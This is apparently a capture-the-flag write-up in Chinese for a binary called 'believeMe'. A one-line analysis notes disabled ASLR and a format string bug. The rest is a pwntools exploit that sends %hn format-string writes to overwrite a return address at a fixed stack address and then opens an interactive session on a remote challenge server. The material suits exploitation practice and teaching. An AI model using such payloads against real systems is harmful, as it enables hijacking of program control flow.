
## 分析

未开启ASLR，格式化字符串漏洞。

### 利用代码
```python
#!/usr/bin/env python2
# coding: utf-8
# Usage: ./exploit.py MODE=remote LOG_LEVEL=warn NOPTRACE NOASLR
from pwn import *
import itertools

IP = "18.223.228.52"
PORT = 13337

context.log_level = 'critical'
context.terminal = ['tmux', 'splitw', '-h']
# context(os='linux',arch='amd64')
mode = args['MODE'].lower()
binary = "./believeMe"

code = context.binary = ELF(binary)
if args['LIBDEBUG']:
    os.environ['LD_LIBRARY_PATH'] = '/dbg{}/lib'.format(code.bits)
if args['LIBC']:
    os.environ['LD_PRELOAD'] = os.path.abspath(args['LIBC'])
libc = code.libc
libc.symbols['main_arena'] = libc.symbols['__malloc_hook'] + 0x10
libc.symbols['one_gadget'] = 0xf1147

def r(x): return io.recv(x)
def ru(x): return io.recvuntil(x)
def rud(x): return io.recvuntil(x, drop=True)
def se(x): return io.send(x)
def sel(x): return io.sendline(x)
def pick32(x): return u32(x[:4].ljust(4, '\0'))
def pick64(x): return u64(x[:8].ljust(8, '\0'))

if mode == "remote":
    context.noptrace = True
    io = remote(IP, PORT)
    # io.recvuntil('sha256(xxxx+')
    # suffix = io.recvuntil(')', drop=True)
    # io.recvuntil('== ')
    # hash_str = io.recvline(keepends=False)
    # io.sendline(iters.bruteforce(lambda x: sha256sumhex(
            # x + suffix) == hash_str, string.printable[:62], 4, 'fixed'))
else:
    io = process("./believeMe")


nox = 0x0804867B
# 原ret address位于0xffffdd1c　为libc_start_main中的返回地址，实际调试发现，重新计算了esp，应该为0xffffdd2c
stack = 0xffffdd2c
payload = p32(0xffffdd2e) + p32(0xffffdd2c) + \
    "%2044c" + "%9$hn" + "%32375c" + "%10$hn"
# payload = "%x." * 15
# payload = p32(0xffffdd26) + p32(0xffffdd24) + \
#     ".%7$x." + "%22$x." + "%23$x." + "%24$x."
print payload

print io.recvrepeat(timeout=0.5)

gdb.attach(io, '''
b *0x080487D3
c
'''
)


io.sendline(payload)
io.interactive()

```